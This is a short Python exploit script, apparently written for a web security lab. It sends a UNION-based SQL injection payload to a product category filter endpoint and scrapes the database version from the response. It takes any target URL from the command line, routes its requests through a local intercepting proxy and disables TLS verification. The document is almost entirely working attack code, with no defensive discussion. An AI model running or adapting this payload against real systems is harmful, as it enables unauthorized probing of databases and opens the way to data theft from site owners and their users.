import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup

# Disable SSL/TLS warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configure proxy settings if needed
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli(url):
    path = '/filter?category=Pets'
    sql_payload = "' UNION SELECT @@version, NULL%23"
    
    try:
        response = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
        response.raise_for_status()
        res = response.text
        soup = BeautifulSoup(res, 'html.parser')
        version = soup.find(string=re.compile('.*\d{1,2}\.\d{1,2}\.\d{1,2}.*'))

        if version is None:
            return False
        else:
            print("[+] The database verison : " + version)
            return True

    except requests.exceptions.RequestException as e:
        print("[-] Error:", e)
        return False


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] For Example: %s http://www.random.com" % sys.argv[0])
        sys.exit(-1)

    target_url = sys.argv[1].strip()
    print("[+]  Dumping")

    if not exploit_sqli(target_url):
        print("[+] SQL Injection not found")
